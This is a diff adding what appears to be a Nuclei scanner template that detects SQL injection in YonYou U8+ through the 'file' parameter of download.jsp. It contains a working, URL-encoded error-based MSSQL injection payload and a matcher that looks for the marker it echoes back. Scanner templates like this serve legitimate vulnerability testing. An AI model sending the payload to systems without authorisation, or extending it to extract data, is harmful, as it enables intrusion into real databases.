@@ -1,0 +1,24 @@
+id: YonYouU8Plus-download-sqlInjection
+
+info:
+  name: YonYouU8+-download-sqlInjection
+  author: iSee857
+  severity: high
+  description: |
+   YonYouU8+-download-sqlInjection
+
+http:
+  - raw:
+      - |
+        GET /business/common/download.jsp?filename=&foldertype=&file=%27+AND+9228+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289228%3D9228%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29+AND+%27BkmE%27%3D%27BkmE HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "qxzxq1qpbxq"
+        part: body
